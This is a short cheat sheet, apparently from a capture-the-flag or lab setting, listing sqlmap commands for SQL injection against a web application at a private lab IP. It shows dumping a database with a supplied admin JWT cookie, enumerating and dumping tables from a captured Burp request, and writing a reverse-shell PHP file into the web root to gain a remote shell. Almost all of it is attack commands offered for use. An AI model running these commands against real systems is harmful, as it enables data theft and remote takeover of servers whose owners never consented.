---
title: Sqlmap 🪲
---
- Useful commands

```shell
sqlmap http://10.10.134.119/admin?user=3 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDc1NzM3Mzh9.EQ-QxUbiFb5WYxEP6e8izPs_r4iGouEevWSjuhE1ZaM' --technique=U --delay=2 -dump
```

- Command with a request with no query params on url:
	- First, copy the request captured with Burp to a file
	- Then:

```shell
sqlmap -r request.txt

# Then do
sqlmap -r request.txt --dbs

# Attack the database you want

sqlmap -r request.txt -D <TABLE_NAME> --tables --dump
```

---

## Get a reverse shell with slqmap:

```shell
sqlmap -r request.txt --dbs --file-dest=/var/www/html/reverse.php --file-write=./reverse.php
```

- Now open open your browser: `http://IP_HOST/reverse.php`

